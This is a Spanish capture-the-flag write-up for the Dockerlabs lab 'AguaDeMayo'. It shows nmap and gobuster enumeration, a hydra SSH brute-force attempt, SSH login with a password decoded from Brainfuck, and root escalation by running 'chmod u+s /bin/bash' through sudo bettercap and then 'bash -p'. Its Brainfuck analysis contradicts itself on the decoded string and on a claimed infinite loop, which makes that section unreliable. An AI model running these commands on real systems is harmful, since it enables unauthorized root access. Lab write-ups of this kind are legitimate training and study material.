
# Writeup Template: Maquina `[ AguaDeMayo ]`

- Tags: #AguaDeMayo
- Dificultad: `[ Facil ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina AguaDeMayo](https://mega.nz/file/kC1nTCoI#MD6FBVLITgA5dtLglSBYbOUtJ_Tb-CmslqZM1kUx6C8)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x aguademayo.zip
sudo bash auto_deploy.sh aguademayo.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
1. `[ 22 ]/[ TCP ]`: [ SSH ] ([ 9.2 ])
2. `[ 80 ]/[ TCP ]`: [ Apache ] ([ 2.4.59 ])
---

## Enumeracion de [Servicio Web Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada relevante
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```

Reporte:
```bash
/images/: Potentially interesting directory w/ listing on 'apache/2.4.59 (debian)'
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
- `[ http://172.17.0.2/images/ ]`: Tenemos una ruta con imagenes: **( agua.ssh.jpg )**
- `[Ruta_Importante]`: [Descripción]

Realizando cracking de **imagenes** Ninguno de los siguientes comandos revela nada.
```bash
file agua_ssh.jpg
strings agua_ssh.jpg
binwalk agua_ssh.jpg
steghide info agua_ssh.jpg
exiftool agua_ssh.jpg 
foremost -i agua_ssh.jpg -o salida/
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/images -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,sh,txt,php.back,zip,tar,gzip
```

- **Hallazgos**:
	No reporta nada relevante


### Analisis de Codigo `Brainfuck` en HTML
Los comentarios HTML (`<!-- -->`) encierran un programa escrito en **Brainfuck**, un lenguaje de programación esotérico. El código Brainfuck dentro del comentario es:

```brainfuck
++++++++++[>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>++++++++++++>++++++++++>++++++++++++>++++++++++>+++++++++++>+++++++++++>+>+<<<<<<<<<<<<<<<<<-]>--.>+.>--.>+.>---.>+++.>---.>---.>+++.>---.>+..>-----..>---.>.>+.>+++.>.
```

### ¿Que hace este programa?
Al ejecutarse, **el código genera un mensaje en español** que dice:  
**`bebeauaqueess ano`** (con un salto de línea al final).

#### Explicacion detallada:
1. **Inicialización**:
   - El bucle `++++++++++[...]` usa una celda inicial (celda 0) como contador (valor 10).
   - Dentro del bucle, se incrementan valores en múltiples celdas de memoria (células 1 a 17) con valores como `+10`, `+12`, etc., según su posición.

2. **Problema en el bucle**:
   - El movimiento de retorno (`<<<<<<<<<<<<<<<<<`) solo tiene **15 `<`**, pero se necesitan **17 `<`** para volver a la celda 0 (debido a que hay 17 `>` dentro del bucle). Esto causa:
     - El contador (celda 0) no se decrementa correctamente.
     - La condición del bucle se verifica en una celda equivocada (celda 2), generando un **bucle infinito** en la mayoría de implementaciones.

3. **Si se corrige el bucle** (con 17 `<`):
   - Tras 10 iteraciones, las celdas tendrían valores predecibles (ej. celda 1 = 100, celda 2 = 100, etc.).
   - Las operaciones después del bucle (`>--.>+.>--. ...`) generan la salida:
     - `b` (98), `e` (101), `b` (98), `e` (101), `a` (97), `g` (103), `u` (117), `a` (97), `q` (113), `u` (117), `ee` (101, 101), `ss` (115, 115), `a` (97), `n` (110), `o` (111), seguido de un salto de línea (`\n` = 10).

4. **Mensaje de salida**:
   - **`b e b e a g u a q u e e s s a n o`** → Forma la cadena **`bebeaguaqueess ano`**. 

### Conclusion:
El código contiene un **error de sintaxis** (faltan 2 `<` en el bucle), pero si se ejecuta corregido, produce el mensaje mencionado. En la práctica, el programa original entraría en un bucle infinito debido al error. El mensaje no tiene un significado claro en español, pero parece una referencia a "bebe agua" seguido de texto ambiguo. 

**Posible intención**: Podría ser un mensaje lúdico o un error de escritura para "bebe agua que es sana" (aunque la salida no coincide exactamente).
### Credenciales Encontradas
- Usuario: `[Usuario]`
- Contraseña: `[ bebeaguaqueess ano ]` # Tenemos una potencial contrasena

**Nota** Aplicando fuerza bruta por ssh con **hydra** no obtuvimos nada
```bash
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p bebeaguaqueessano -f ssh:172.17.0.2
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
No hubo vector de ataque pero si descubrimos que **agua_ssh** es un potencial usuario para **ssh** por lo cual probaremos conectandomos con las credenciales:
### Intrusion
Nos conectamos atraves de **ssh**
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh agua@172.17.0.2 ( bebeaguaqueessano )
```

---

## Escalada de Privilegios
### Enumeracion del Sistema
```bash
# Comandos clave ejecutados
sudo -l

User agua may run the following commands on a4268a8d8f5e:
    (root) NOPASSWD: /usr/bin/bettercap # Tenemos un binario vulnerable
```

**Hallazgos Clave:**
- Binario con privilegios: `[ /usr/bin/bettercap ]`
- Credenciales de usuario: `[ root ]:[ ]`

### Explotacion de Privilegios

###### Usuario `[ Agua ]`:

```bash
# Comando para escalar al usuario: ( root )
sudo -u root /usr/bin/bettercap -caplet script
```

Es una ejecución de **BetterCap** (una herramienta avanzada de redes y seguridad) con privilegios de **root**, Y ya ejecutado procedemos a ejecutar comandos:
```bash
172.17.0.0/16 > 172.17.0.2  » ! chmod u+s /bin/bash
```

Listamos ahora los permisos de la bash:
```bash
ls -l /bin/bash
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
```

Ahora podemos lanzarnos una bash como **root**:
```bash
bash -p
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.2# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a leer codigo **Brainfuck** que no conocimaos
2. Aprendimos a explotar este binario **bettercap** que es para analizis de redes

## Recomendaciones de Seguridad
- No almacenar contrasenas en codigo **Brainfuck**
